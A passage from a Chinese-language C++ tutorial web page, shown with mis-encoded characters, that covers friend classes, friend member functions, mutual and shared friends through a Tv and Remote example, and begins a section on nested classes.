</span>&#123; state = (state == On) ? Off : On; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">ison</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> state == On; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">volup</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">voldown</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chanup</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chandown</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">()</span> </span>&#123; mode = (mode == Antenna) ? Cable : Antenna; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_input</span><span class="params">()</span> </span>&#123; input = (input == TV) ? DVD : TV; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">settings</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// display all settings</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remote æ–¹æ³•çš„å®ç° (éœ€è¦çœ‹åˆ° Tv çš„å®Œæ•´å®šä¹‰)</span></span><br><span class="line"><span class="comment">// é€šå¸¸æ”¾åœ¨ .cpp æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ Tv å®šä¹‰ä¹‹å</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Remote::volup</span><span class="params">(Tv &amp; t)</span> </span>&#123; <span class="keyword">return</span> t.volup(); &#125; <span class="comment">// è°ƒç”¨ Tv çš„å…¬æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Remote::voldown</span><span class="params">(Tv &amp; t)</span> </span>&#123; <span class="keyword">return</span> t.voldown(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::onoff</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.onoff(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::chanup</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.chanup(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::chandown</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.chandown(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_mode</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.set_mode(); &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_input</span><span class="params">(Tv &amp; t)</span> </span>&#123; t.set_input(); &#125;</span><br><span class="line"><span class="comment">// set_chan éœ€è¦ç›´æ¥è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ channel</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å› ä¸º Remote æ˜¯ Tv çš„å‹å…ƒï¼Œå¯ä»¥ç›´æ¥è®¿é—® t.channel</span></span><br><span class="line">    t.channel = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tv æ–¹æ³•çš„å®ç° (éƒ¨åˆ†)</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Tv::volup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &lt; MaxVal) &#123;</span><br><span class="line">        volume++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">Tv::voldown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (volume &gt; MinVal) &#123;</span><br><span class="line">        volume--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Tv::chanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (channel &lt; maxchannel) channel++;</span><br><span class="line">    <span class="keyword">else</span> channel = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Tv::chandown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (channel &gt; <span class="number">1</span>) channel--;</span><br><span class="line">    <span class="keyword">else</span> channel = maxchannel;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... settings() å®ç°éœ€è¦ iostream ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TV_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use_tv.cpp -- ä½¿ç”¨ Tv å’Œ Remote</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tv::settings() å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tv::settings</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;TV is &quot;</span> &lt;&lt; (state == On ? <span class="string">&quot;On&quot;</span> : <span class="string">&quot;Off&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (state == On) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Volume setting = &quot;</span> &lt;&lt; volume &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Channel setting = &quot;</span> &lt;&lt; channel &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mode = &quot;</span> &lt;&lt; (mode == Antenna ? <span class="string">&quot;antenna&quot;</span> : <span class="string">&quot;cable&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input = &quot;</span> &lt;&lt; (input == TV ? <span class="string">&quot;TV&quot;</span> : <span class="string">&quot;DVD&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    Tv s42;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial settings for 42\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line">    s42.onoff(); <span class="comment">// æ‰“å¼€ç”µè§†</span></span><br><span class="line">    s42.chanup(); <span class="comment">// å¢åŠ é¢‘é“</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAdjusted settings for 42\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line"></span><br><span class="line">    Remote grey; <span class="comment">// åˆ›å»ºé¥æ§å™¨</span></span><br><span class="line">    grey.set_chan(s42, <span class="number">10</span>); <span class="comment">// é¥æ§å™¨è®¾ç½®é¢‘é“ (è°ƒç”¨å‹å…ƒå¯è®¿é—®çš„ç§æœ‰æˆå‘˜)</span></span><br><span class="line">    grey.volup(s42);      <span class="comment">// é¥æ§å™¨å¢åŠ éŸ³é‡</span></span><br><span class="line">    grey.volup(s42);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSettings after using remote:\n&quot;</span>;</span><br><span class="line">    s42.settings();</span><br><span class="line"></span><br><span class="line">    <span class="function">Tv <span class="title">s58</span><span class="params">(Tv::On)</span></span>; <span class="comment">// åˆ›å»ºä¸€ä¸ªå·²æ‰“å¼€çš„ç”µè§†</span></span><br><span class="line">    s58.set_mode(); <span class="comment">// åˆ‡æ¢æ¨¡å¼</span></span><br><span class="line">    grey.set_chan(s58, <span class="number">28</span>); <span class="comment">// é¥æ§å™¨æ§åˆ¶å¦ä¸€å°ç”µè§†</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSettings for 58\&quot; TV:\n&quot;</span>;</span><br><span class="line">    s58.settings();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>Remote</code> ç±»è¢«å£°æ˜ä¸º <code>Tv</code> çš„å‹å…ƒï¼Œå› æ­¤ <code>Remote</code> çš„æˆå‘˜å‡½æ•°ï¼ˆå¦‚ <code>set_chan</code>ï¼‰å¯ä»¥ç›´æ¥è®¿é—® <code>Tv</code> å¯¹è±¡çš„ç§æœ‰æˆå‘˜ <code>channel</code>ã€‚</p><h3 id="15-1-2-å‹å…ƒæˆå‘˜å‡½æ•°"><a href="#15-1-2-å‹å…ƒæˆå‘˜å‡½æ•°" class="headerlink" title="15.1.2 å‹å…ƒæˆå‘˜å‡½æ•°"></a>15.1.2 å‹å…ƒæˆå‘˜å‡½æ•°</h3><p>æœ‰æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦è®©æ•´ä¸ªç±»æˆä¸ºå‹å…ƒï¼Œåªéœ€è¦è®©æŸä¸ªç±»çš„<strong>ç‰¹å®šæˆå‘˜å‡½æ•°</strong>æˆä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚</p><p><strong>å£°æ˜è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HostClass</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// å£°æ˜ OtherClass çš„ memberFunc ä¸ºå‹å…ƒ</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> ReturnType <span class="title">OtherClass::memberFunc</span><span class="params">(parameters)</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘é¡ºåºå’Œå‰å‘å£°æ˜:</strong></p><p>å£°æ˜å‹å…ƒæˆå‘˜å‡½æ•°æ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„ç¼–è¯‘é¡ºåºå’Œå‰å‘å£°æ˜ï¼š</p><ol><li> <strong>å®šä¹‰æä¾›å‹å…ƒæˆå‘˜å‡½æ•°çš„ç±» (OtherClass):</strong> ç¼–è¯‘å™¨éœ€è¦å…ˆçŸ¥é“ <code>OtherClass</code> çš„å®Œæ•´å®šä¹‰ï¼Œæ‰èƒ½å¤„ç†å…¶ä¸­çš„ <code>memberFunc</code>ã€‚</li><li> <strong>å®šä¹‰å®¿ä¸»ç±» (HostClass):</strong> åœ¨ <code>HostClass</code> ä¸­å£°æ˜ <code>OtherClass::memberFunc</code> ä¸ºå‹å…ƒã€‚</li><li> <strong>å®šä¹‰å‹å…ƒæˆå‘˜å‡½æ•° (OtherClass::memberFunc):</strong> è¿™ä¸ªå‡½æ•°çš„å®ç°éœ€è¦çœ‹åˆ° <code>HostClass</code> çš„å®Œæ•´å®šä¹‰ï¼Œå› ä¸ºå®ƒéœ€è¦è®¿é—® <code>HostClass</code> çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ã€‚</li></ol><p>è¿™é€šå¸¸éœ€è¦ä½¿ç”¨**å‰å‘å£°æ˜ (Forward Declaration)**ã€‚</p><p><strong>ç¤ºä¾‹:</strong> è®© <code>Remote::set_chan</code> æˆä¸º <code>Tv</code> çš„å‹å…ƒï¼Œè€Œä¸æ˜¯æ•´ä¸ª <code>Remote</code> ç±»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tvfm.h -- Tv and Remote classes using a friend member</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TVFM_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TVFM_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span>;</span> <span class="comment">// *** 1. å‰å‘å£°æ˜ Tv ***</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Remote</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... (Remote å®šä¹‰åŒå‰) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>; <span class="comment">// å£°æ˜ set_chan</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tv</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... (Tv å®šä¹‰åŒå‰) ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// *** 2. å°† Remote::set_chan å£°æ˜ä¸ºå‹å…ƒ ***</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span></span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// *** 3. å®šä¹‰ Remote::set_chan (éœ€è¦çœ‹åˆ° Tv çš„å®Œæ•´å®šä¹‰) ***</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Remote::set_chan</span><span class="params">(Tv &amp; t, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    t.channel = c; <span class="comment">// ç°åœ¨å¯ä»¥è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ channel</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (å…¶ä»– Remote å’Œ Tv çš„å†…è”æ–¹æ³•å®šä¹‰) ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TVFM_H_</span></span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¿®æ”¹åçš„ç‰ˆæœ¬ä¸­ï¼Œåªæœ‰ <code>Remote::set_chan</code> å‡½æ•°å¯ä»¥è®¿é—® <code>Tv</code> çš„ç§æœ‰æˆå‘˜ï¼Œè€Œ <code>Remote</code> çš„å…¶ä»–æˆå‘˜å‡½æ•°åˆ™ä¸èƒ½ï¼ˆé™¤éå®ƒä»¬åªè°ƒç”¨ <code>Tv</code> çš„å…¬æœ‰æ–¹æ³•ï¼‰ã€‚è¿™æä¾›äº†æ¯”å‹å…ƒç±»æ›´ç²¾ç»†çš„è®¿é—®æ§åˆ¶ã€‚</p><h3 id="15-1-3-å…¶ä»–å‹å…ƒå…³ç³»"><a href="#15-1-3-å…¶ä»–å‹å…ƒå…³ç³»" class="headerlink" title="15.1.3 å…¶ä»–å‹å…ƒå…³ç³»"></a>15.1.3 å…¶ä»–å‹å…ƒå…³ç³»</h3><p><strong>ç›¸äº’å‹å…ƒ (Mutual Friends):</strong> ä¸¤ä¸ªç±»å¯ä»¥äº’ä¸ºå‹å…ƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span> <span class="comment">// å‰å‘å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span> <span class="comment">// B æ˜¯ A çš„å‹å…ƒ</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataA;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassA</span>;</span> <span class="comment">// A æ˜¯ B çš„å‹å…ƒ</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataB;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">processA</span><span class="params">(ClassA&amp; a)</span> </span>&#123;</span><br><span class="line">        a.dataA = <span class="number">10</span>; <span class="comment">// B å¯ä»¥è®¿é—® A çš„ç§æœ‰æˆå‘˜</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassA çš„æˆå‘˜å‡½æ•°å®ç°éœ€è¦çœ‹åˆ° ClassB çš„å®Œæ•´å®šä¹‰</span></span><br><span class="line"><span class="comment">// void ClassA::processB(ClassB&amp; b) &#123; b.dataB = 20; &#125;</span></span><br></pre></td></tr></table></figure><p><strong>å°†å‹å…ƒå‡½æ•°æ”¾åœ¨ä½•å¤„:</strong></p><ul><li>  å¦‚æœå‹å…ƒå‡½æ•°åªè®¿é—®ç±»çš„å…¬æœ‰æ¥å£ï¼Œå®ƒå¯ä»¥æ˜¯æ™®é€šéæˆå‘˜å‡½æ•°ã€‚</li><li>  å¦‚æœå‹å…ƒå‡½æ•°éœ€è¦è®¿é—®ç±»çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ï¼Œå®ƒå¿…é¡»è¢«å£°æ˜ä¸ºå‹å…ƒã€‚</li><li>  å¦‚æœä¸€ä¸ªå‡½æ•°éœ€è¦è®¿é—®<strong>ä¸¤ä¸ªä¸åŒç±»</strong>çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ï¼Œé‚£ä¹ˆå®ƒéœ€è¦è¢«è¿™ä¸¤ä¸ªç±»éƒ½å£°æ˜ä¸ºå‹å…ƒã€‚</li></ul><h3 id="15-1-4-å…±åŒçš„å‹å…ƒ"><a href="#15-1-4-å…±åŒçš„å‹å…ƒ" class="headerlink" title="15.1.4 å…±åŒçš„å‹å…ƒ"></a>15.1.4 å…±åŒçš„å‹å…ƒ</h3><p>ä¸€ä¸ªå‡½æ•°å¯ä»¥æ˜¯å¤šä¸ªç±»çš„å‹å…ƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span>;</span> <span class="comment">// å‰å‘å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassD</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataD;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataC;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…±åŒå‹å…ƒçš„å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sharedFriend</span><span class="params">(<span class="keyword">const</span> ClassC&amp; c, <span class="keyword">const</span> ClassD&amp; d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C data: &quot;</span> &lt;&lt; c.dataC &lt;&lt; <span class="string">&quot;, D data: &quot;</span> &lt;&lt; d.dataD &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sharedFriend</code> å‡½æ•°å¯ä»¥åŒæ—¶è®¿é—® <code>ClassC</code> å’Œ <code>ClassD</code> çš„ç§æœ‰æˆå‘˜ã€‚</p><p><strong>ä½¿ç”¨å‹å…ƒçš„æ—¶æœº:</strong></p><p>å‹å…ƒç ´åäº†ç±»çš„å°è£…æ€§ï¼Œå› ä¸ºå®ƒå…è®¸å¤–éƒ¨ä»£ç ç›´æ¥è®¿é—®å†…éƒ¨å®ç°ç»†èŠ‚ã€‚å› æ­¤ï¼Œåº”è¯¥<strong>è°¨æ…ä½¿ç”¨</strong>å‹å…ƒã€‚</p><ul><li><strong>ä½•æ—¶è€ƒè™‘ä½¿ç”¨:</strong><ul><li>  <strong>é‡è½½è¿ç®—ç¬¦:</strong> å°¤å…¶æ˜¯éœ€è¦è®¿é—®ä¸¤ä¸ªä¸åŒç±»å¯¹è±¡å†…éƒ¨æ•°æ®ï¼ˆå¦‚ <code>operator&lt;&lt;</code> è¾“å‡ºæµæ“ä½œç¬¦ï¼‰æˆ–å·¦æ“ä½œæ•°ä¸æ˜¯ç±»å¯¹è±¡çš„æƒ…å†µã€‚</li><li>  <strong>ç´§å¯†åä½œçš„ç±»:</strong> å½“ä¸¤ä¸ªæˆ–å¤šä¸ªç±»åœ¨æ¦‚å¿µä¸Šç´§å¯†è€¦åˆï¼Œéœ€è¦é«˜æ•ˆåœ°å…±äº«ä¿¡æ¯æ—¶ï¼ˆå¦‚ <code>Tv</code> å’Œ <code>Remote</code>ï¼‰ã€‚</li><li>  <strong>åº•å±‚å®ç°:</strong> åœ¨æŸäº›åº•å±‚åº“æˆ–æ¡†æ¶ä¸­ï¼Œä¸ºäº†æ€§èƒ½æˆ–å®ç°ç‰¹å®šåŠŸèƒ½å¯èƒ½éœ€è¦å‹å…ƒã€‚</li></ul></li><li>  <strong>æ›¿ä»£æ–¹æ¡ˆ:</strong> åœ¨ä½¿ç”¨å‹å…ƒä¹‹å‰ï¼Œè€ƒè™‘æ˜¯å¦å¯ä»¥é€šè¿‡æ‰©å±•ç±»çš„å…¬æœ‰æ¥å£ï¼ˆæ·»åŠ è®¿é—®å™¨æˆ–åŠŸèƒ½å‡½æ•°ï¼‰æ¥æ»¡è¶³éœ€æ±‚ã€‚</li></ul><p>å‹å…ƒæä¾›äº†ä¸€ç§ç»•è¿‡è®¿é—®æ§åˆ¶çš„æœºåˆ¶ï¼Œä½†åº”ä½œä¸ºæœ€åçš„æ‰‹æ®µï¼Œè€Œä¸æ˜¯å¸¸è§„è®¾è®¡å·¥å…·ã€‚</p><h2 id="15-2-åµŒå¥—ç±»"><a href="#15-2-åµŒå¥—ç±»" class="headerlink" title="15.2 åµŒå¥—ç±»"></a>15.2 åµŒå¥—ç±»</h2><p>C++ å…è®¸åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰å¦ä¸€ä¸ªç±»ï¼Œè¿™ç§åœ¨ç±»å†…éƒ¨å®šä¹‰çš„ç±»ç§°ä¸º<strong>åµŒå¥—ç±» (Nested Class)</strong> æˆ–<strong>å†…éƒ¨ç±» (Inner Class)**ã€‚åŒ…å«åµŒå¥—ç±»çš„ç±»ç§°ä¸º</strong>å¤–å›´ç±» (Enclosing Class)** æˆ–**å¤–éƒ¨ç±» (Outer Class)**ã€‚</p><p><strong>ç›®çš„:</strong></p><p>åµŒå¥—ç±»ä¸»è¦ç”¨äºå®ç°ä¸å¤–å›´ç±»ç´§å¯†ç›¸å…³çš„è¾…åŠ©ç±»æˆ–æ•°æ®ç»“æ„ï¼Œæœ‰åŠ©äºå°†å®ç°ç»†èŠ‚å°è£…åœ¨å¤–å›´ç±»å†…éƒ¨ï¼Œæé«˜ä»£ç çš„ç»„ç»‡æ€§å’Œå±€éƒ¨æ€§ã€‚ä¾‹å¦‚ï¼Œé“¾è¡¨æˆ–æ ‘ç»“æ„çš„èŠ‚ç‚¹ (<code>Node</code>) é€šå¸¸åªä¸ºç‰¹å®šçš„å®¹å™¨ç±»æœåŠ¡ï¼Œå°†å…¶åµŒå¥—åœ¨å®¹å™¨ç±»å†…éƒ¨å°±å¾ˆè‡ªç„¶ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnclosingClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// åµŒå¥—ç±»å¯ä»¥æœ‰è‡ªå·±çš„è®¿é—®æ§åˆ¶</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassPrivate</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassProtected</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NestedClassPublic</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> nestedData;</span><br><span class="line">        EnclosingClass* enclosingPtr; <span class="comment">// å¯ä»¥æŒæœ‰å¤–å›´ç±»æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        NestedClassPublic(EnclosingClass* enc = <span class="literal">nullptr</span>) : enclosingPtr(enc) &#123;&#125;</span><br><span class="line">        <span 